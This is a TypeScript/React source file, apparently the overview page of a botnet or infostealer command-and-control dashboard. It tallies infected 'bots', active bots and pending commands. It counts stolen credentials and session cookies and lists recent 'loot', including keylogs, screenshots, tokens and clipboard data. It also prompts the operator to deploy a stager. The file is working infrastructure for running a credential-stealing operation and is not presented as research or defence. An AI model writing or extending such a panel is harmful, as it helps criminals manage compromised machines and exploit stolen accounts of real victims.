import { createClient } from "@/lib/supabase/server";

async function getStats() {
    const supabase = await createClient();

    const [botsRes, lootRes, commandsRes] = await Promise.all([
        supabase.from("bots").select("id, status, last_seen_at", { count: "exact" }),
        supabase.from("loot").select("id, category", { count: "exact" }),
        supabase.from("commands").select("id, status", { count: "exact" }),
    ]);

    const bots = botsRes.data || [];
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const activeBots = bots.filter((b) => b.last_seen_at && b.last_seen_at > fiveMinAgo).length;

    return {
        totalBots: botsRes.count || 0,
        activeBots,
        totalLoot: lootRes.count || 0,
        pendingCommands: (commandsRes.data || []).filter((c) => c.status === "pending").length,
        credentialCount: (lootRes.data || []).filter((l) => l.category === "credentials").length,
        cookieCount: (lootRes.data || []).filter((l) => l.category === "cookies").length,
    };
}

async function getRecentLoot() {
    const supabase = await createClient();
    const { data } = await supabase
        .from("loot")
        .select("id, bot_id, category, title, created_at")
        .order("created_at", { ascending: false })
        .limit(8);
    return data || [];
}

export default async function OverviewPage() {
    const stats = await getStats();
    const recentLoot = await getRecentLoot();

    const statCards = [
        { label: "Total Bots", value: stats.totalBots, icon: "🖥️", color: "from-blue-500 to-indigo-500" },
        { label: "Active (5m)", value: stats.activeBots, icon: "🟢", color: "from-emerald-500 to-green-500" },
        { label: "Total Loot", value: stats.totalLoot, icon: "📦", color: "from-amber-500 to-orange-500" },
        { label: "Credentials", value: stats.credentialCount, icon: "🔐", color: "from-rose-500 to-pink-500" },
        { label: "Sessions", value: stats.cookieCount, icon: "🍪", color: "from-violet-500 to-purple-500" },
        { label: "Pending Cmds", value: stats.pendingCommands, icon: "⏳", color: "from-cyan-500 to-teal-500" },
    ];

    const categoryIcons: Record<string, string> = {
        credentials: "🔐",
        cookies: "🍪",
        keylog: "⌨️",
        screenshot: "📸",
        token: "🔑",
        network: "🌐",
        clipboard: "📋",
        form: "📝",
        profile: "👤",
        websocket: "🔌",
        other: "📦",
    };

    return (
        <div>
            {/* Header */}
            <div className="mb-8">
                <h1 className="text-2xl font-bold text-white">Dashboard Overview</h1>
                <p className="text-zinc-500 text-sm mt-1">Real-time operational status</p>
            </div>

            {/* Stat Cards */}
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 mb-8">
                {statCards.map((card) => (
                    <div
                        key={card.label}
                        className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl p-4 hover:border-zinc-700/50 transition-all"
                    >
                        <div className="flex items-center justify-between mb-3">
                            <span className="text-2xl">{card.icon}</span>
                            <div className={`w-2 h-2 rounded-full bg-gradient-to-r ${card.color}`} />
                        </div>
                        <p className="text-2xl font-bold text-white">{card.value}</p>
                        <p className="text-xs text-zinc-500 mt-1">{card.label}</p>
                    </div>
                ))}
            </div>

            {/* Recent Loot */}
            <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                <div className="px-6 py-4 border-b border-zinc-800/50 flex items-center justify-between">
                    <h2 className="text-sm font-semibold text-white">Recent Loot</h2>
                    <a href="/loot" className="text-xs text-emerald-400 hover:text-emerald-300">View all →</a>
                </div>
                {recentLoot.length === 0 ? (
                    <div className="px-6 py-12 text-center">
                        <p className="text-zinc-500 text-sm">No loot captured yet.</p>
                        <p className="text-zinc-600 text-xs mt-1">Deploy a stager to begin collection.</p>
                    </div>
                ) : (
                    <div className="divide-y divide-zinc-800/50">
                        {recentLoot.map((item) => (
                            <div key={item.id} className="px-6 py-3.5 flex items-center justify-between hover:bg-zinc-800/20 transition-colors">
                                <div className="flex items-center gap-3">
                                    <span className="text-lg">{categoryIcons[item.category] || "📦"}</span>
                                    <div>
                                        <p className="text-sm text-white font-medium">{item.title}</p>
                                        <p className="text-xs text-zinc-500">Bot: {item.bot_id.slice(0, 12)}...</p>
                                    </div>
                                </div>
                                <div className="text-right">
                                    <span className="inline-block px-2 py-0.5 rounded-md bg-zinc-800 text-xs text-zinc-400 capitalize">
                                        {item.category}
                                    </span>
                                    <p className="text-[11px] text-zinc-600 mt-1">
                                        {new Date(item.created_at).toLocaleString()}
                                    </p>
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}
